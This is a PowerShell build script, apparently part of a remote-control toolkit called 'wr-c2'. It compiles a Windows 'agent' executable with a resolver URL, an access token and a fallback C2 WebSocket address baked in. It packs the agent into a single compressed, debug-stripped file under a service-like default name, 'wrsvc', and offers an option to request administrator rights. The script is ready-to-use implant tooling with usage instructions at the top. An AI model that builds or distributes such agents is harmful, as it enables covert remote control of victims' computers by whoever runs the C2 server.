#requires -Version 5.1
<#
  Build the agent.

  .\build.ps1 -Resolver "https://raw.githubusercontent.com/you/wr-c2/main/resolver/c2.json" `
              -Token "AGENT_TOKEN_FROM_RENDER" `
              -C2 "wss://your-app.onrender.com/ws"
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Resolver,
    [Parameter(Mandatory = $true)][string]$Token,
    [string]$C2 = "",
    [string]$Name = "wrsvc",
    [string]$Tag = "",
    [string]$Version = "1.0.0",
    [switch]$Admin,
    [switch]$NoCompress
)

$ErrorActionPreference = "Stop"
$root = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $Tag) { $Tag = $Name }

$gen = Join-Path $root "agent\Generated\BuildInfo.g.cs"
$proj = Join-Path $root "agent\WRAgent.csproj"
$dist = Join-Path $root "dist"

New-Item -ItemType Directory -Force -Path (Split-Path $gen) | Out-Null
New-Item -ItemType Directory -Force -Path $dist | Out-Null

function Esc([string]$s) { if ($null -eq $s) { "" } else { $s.Replace('"', '""') } }

$src = @"
// AUTO-GENERATED by build.ps1 — do not edit by hand.
namespace WRAgent
{
    internal static class BuildInfo
    {
        internal const string Resolver = @"$(Esc $Resolver)";
        internal const string AgentToken = @"$(Esc $Token)";
        internal const string FallbackC2 = @"$(Esc $C2)";
        internal const string AgentTag = @"$(Esc $Tag)";
        internal const string Version = @"$(Esc $Version)";
    }
}
"@
Set-Content -Path $gen -Value $src -Encoding UTF8

$manifest = if ($Admin) { Join-Path $root "agent\app.admin.manifest" } else { Join-Path $root "agent\app.manifest" }

$args = @(
    "publish", $proj,
    "-c", "Release",
    "-r", "win-x64",
    "--self-contained", "true",
    "-p:PublishSingleFile=true",
    "-p:IncludeNativeLibrariesForSelfExtract=true",
    "-p:AssemblyName=$Name",
    "-p:ApplicationManifest=$manifest",
    "-p:DebugType=None",
    "-o", $dist
)
if (-not $NoCompress) { $args += "-p:EnableCompressionInSingleFile=true" }

Write-Host "building $Name ..." -ForegroundColor Cyan
& dotnet @args
if ($LASTEXITCODE -ne 0) { throw "dotnet publish failed" }

$exe = Join-Path $dist "$Name.exe"
if (-not (Test-Path $exe)) { throw "expected $exe" }

$size = [math]::Round((Get-Item $exe).Length / 1MB, 2)
Write-Host "ready: $exe ($size MB)" -ForegroundColor Green
Write-Host ""
Write-Host "resolver : $Resolver" -ForegroundColor DarkGray
Write-Host "c2       : $C2" -ForegroundColor DarkGray
Write-Host "token    : $($Token.Substring(0, [Math]::Min(6, $Token.Length)))..." -ForegroundColor DarkGray
